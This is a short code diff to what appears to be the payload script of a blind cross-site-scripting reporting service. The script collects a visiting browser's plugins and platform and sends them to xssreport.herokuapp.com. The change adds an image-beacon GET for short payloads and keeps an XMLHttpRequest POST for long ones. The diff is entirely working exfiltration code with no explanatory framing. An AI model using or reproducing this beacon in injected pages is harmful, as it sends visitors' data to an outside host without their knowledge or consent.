@@ -299,9 +299,16 @@ for p in navigator.plugins
 a += '; Platform:' + navigator.platform + ';'
 d += '&a=' + encodeURIComponent(a)
 
-xmlhttp = if window.XMLHttpRequest then new XMLHttpRequest() else new ActiveXObject("Microsoft.XMLHTTP")
-xmlhttp.open("POST", (if 'https:' == document.location.protocol then 'https://' else 'http://') + "xssreport.herokuapp.com/r/<%= uri %>/",true)
-xmlhttp.send(d)
+getURL = ->
+  (if 'https:' == document.location.protocol then 'https://' else 'http://') + "xssreport.herokuapp.com/r/<%= uri %>/"
+
+if d.length < 1800
+  i = new Image()
+  i.src = getURL() + "?" + d
+else
+  xmlhttp = if window.XMLHttpRequest then new XMLHttpRequest() else new ActiveXObject("Microsoft.XMLHTTP")
+  xmlhttp.open("POST", getURL(), true)
+  xmlhttp.send(d)
   </script>
   <div class="container">
     <div class="">
